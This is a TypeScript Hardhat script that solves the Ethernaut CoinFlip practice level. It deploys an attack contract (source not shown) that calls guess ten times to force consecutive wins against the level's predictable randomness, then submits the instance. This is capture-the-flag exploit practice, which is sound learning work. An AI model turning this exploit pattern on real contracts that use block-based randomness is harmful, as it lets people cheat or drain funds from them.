import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { getEthernautContract, loadOrCreateLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

let signer: Signer
const levelAddress = '0x4dF32584890A0026e56f7535d0f2C6486753624f'

const main = async () => {
  signer = (await ethers.getSigners())[0] as Signer

  const ethernautContract = getEthernautContract(signer)
  const targetContract = await loadOrCreateLevelInstance('CoinFlip', levelAddress, signer)
  const attackContract = await loadOrDeployContract('CoinFlipAttack', [targetContract.address], signer)

  for (let i = 0; i < 10; i++) {
    const guessTx = await attackContract.guess({ gasLimit: 200_000 })
    console.log('guess tx hash', guessTx.hash)
    const guessReceipt = await guessTx.wait()
    console.log(JSON.stringify(guessReceipt, null, 2))

    console.log('Consecutive wins: ', (await targetContract.consecutiveWins()).toString())
  }

  const submitTx = await ethernautContract.submitLevelInstance(targetContract.address)
  const submitReceipt = await submitTx.wait()

  console.log(JSON.stringify(submitReceipt, null, 2))
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
